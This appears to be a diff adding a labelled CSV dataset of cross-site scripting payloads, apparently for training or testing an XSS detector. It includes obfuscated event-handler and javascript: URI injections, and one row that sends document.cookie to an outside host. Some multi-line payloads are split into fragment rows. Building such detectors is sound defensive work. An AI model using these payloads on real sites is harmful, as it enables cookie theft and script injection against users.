@@ -1,0 +1,133 @@
+Sentence,Label
+<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>,1
+<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>,1
+<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>,1
+<style><img title="</style><img src onerror=alert(1)>"></style>,1
+<script><img title="</script><img src onerror=alert(1)>"></script>,1
+<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>,1
+<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>,1
+<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>,1
+<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>,1
+<title><img title="</title><img src onerror=alert(1)>"></title>,1
+<script>onerror=alert;throw 1</script>,1
+<script>{onerror=alert}throw 1</script>,1
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>,1
+<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>,1
+<script>location='javascript:alert\x281\x29'</script>,1
+<script>location=name</script>,1
+<script>alert`1`</script>,1
+<script>new Function`X${document.location.hash.substr`1`}`</script>,1
+<script>Function`X${document.location.hash.substr`1`}```</script>,1
+<video><source onerror=location=/\02.rs/+document.cookie>,1
+<svg onload=alert(1),1
+<svg onload=alert(1)<!--,1
+<script>var{a:onerror}={a:alert};throw 1</script>,1
+<script>var{haha:onerror=alert}=0;throw 1</script>,1
+<script>window.name='javascript:alert(1)';</script><svg onload=location=name>,1
+<script>window.name='javascript:alert(1)';function blah(){},1
+blah(""+{a:location=name}+"")</script>,1
+<script>window.name='javascript:alert(1)';function blah(){},1
+blah(""+new class b{toString=e=>location=name}+"")</script>,1
+<xss class=progress-bar-animated onanimationstart=alert(1)>,1
+<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>,1
+<iframe src="javascript:alert(1)">,1
+<object data="javascript:alert(1)">,1
+<embed src="javascript:alert(1)">,1
+<a href="javascript:alert(1)">XSS</a>,1
+<a href="JaVaScript:alert(1)">XSS</a>,1
+<a href="       javascript:alert(1)">XSS</a>,1
+<a href="javas  cript:alert(1)">XSS</a>,1
+<a href="javascript,1
+:alert(1)">XSS</a>,1
+<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>,1
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>,1
+<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>,1
+<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>,1
+<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>,1
+<math><x href="javascript:alert(1)">blah,1
+<form><button formaction=javascript:alert(1)>XSS,1
+<form><input type=submit formaction=javascript:alert(1) value=XSS>,1
+<form action=javascript:alert(1)><input type=submit value=XSS>,1
+<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>,1
+<a href="javascript://%0aalert(1)">XSS</a>,1
+<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>,1
+<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>,1
+<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>,1
+<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>,1
+<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>,1
+<script>location.protocol='javascript'</script>,1
+<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>,1
+<script>navigation.navigate('javascript:alert(1)')</script>,1
+<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>,1
+<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>,1
+<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>,1
+<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X),1
+<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X),1
+<a href=# download="filename.html">Test</a>,1
+<img referrerpolicy="no-referrer" src="//portswigger-labs.net">,1
+<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>,1
+<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>,1
+<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>,1
+<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>,1
+<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form>,1
+<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form>,1
+<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">,1
+<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-,1
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-,1
++/v8,1
++ADw-script+AD4-alert(1)+ADw-/script+AD4-,1
++/v9,1
++ADw-script+AD4-alert(1)+ADw-/script+AD4-,1
++/v+,1
++ADw-script+AD4-alert(1)+ADw-/script+AD4-,1
++/v/,1
++ADw-script+AD4-alert(1)+ADw-/script+AD4-,1
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">,1
+<iframe sandbox src="//portswigger-labs.net"></iframe>,1
+<meta name="referrer" content="no-referrer">,1
+%C0%BCscript>alert(1)</script>,1
+%E0%80%BCscript>alert(1)</script>,1
+%F0%80%80%BCscript>alert(1)</script>,1
+%F8%80%80%80%BCscript>alert(1)</script>,1
+%FC%80%80%80%80%BCscript>alert(1)</script>,1
+<script>\u0061lert(1)</script>,1
+<script>\u{61}lert(1)</script>,1
+<script>\u{0000000061}lert(1)</script>,1
+<script>eval('\x61lert(1)')</script>,1
+<script>eval('\141lert(1)')</script>,1
+<script>eval('alert(\061)')</script>,1
+<script>eval('alert(\61)')</script>,1
+<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>,1
+<svg><script>&#97;lert(1)</script></svg>,1
+<svg><script>&#x61;lert(1)</script></svg>,1
+<svg><script>alert&NewLine;(1)</script></svg>,1
+<a href="&#0000106avascript:alert(1)">XSS</a>,1
+<a href="&#x6a;avascript:alert(1)">XSS</a>,1
+<a href="j&#x61vascript:alert(1)">XSS</a>,1
+<a href="&#x6a,1
+avascript:alert(1)">XSS</a>,1
+<a href="&#x6a avascript:alert(1)">XSS</a>,1
+<a href="&#x0000006a;avascript:alert(1)">XSS</a>,1
+<a href="&#X6A;avascript:alert(1)">XSS</a>,1
+<a href="javascript&colon;alert(1)">XSS</a>,1
+<a href="java&Tab;script:alert(1)">XSS</a>,1
+<a href="java&NewLine;script:alert(1)">XSS</a>,1
+<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>,1
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>,1
+<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>,1
+<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>,1
+<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>,1
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>,1
+<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>,1
+{{constructor.constructor('alert(1)')()}},1
+<div v-html="''.constructor.constructor('alert(1)')()">a</div>,1
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">,1
+<iframe src=http://xss.rocks/scriptlet.html <,1
+<BODY BACKGROUND="javascript:alert('XSS')">,1
+<IMG SRC=# onmouseover="alert('xxs')">,1
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>,1
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>, 1
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>,1
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>,1
+javascript:/*--></title></style></textarea></script></xmp>,1
+<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>,1
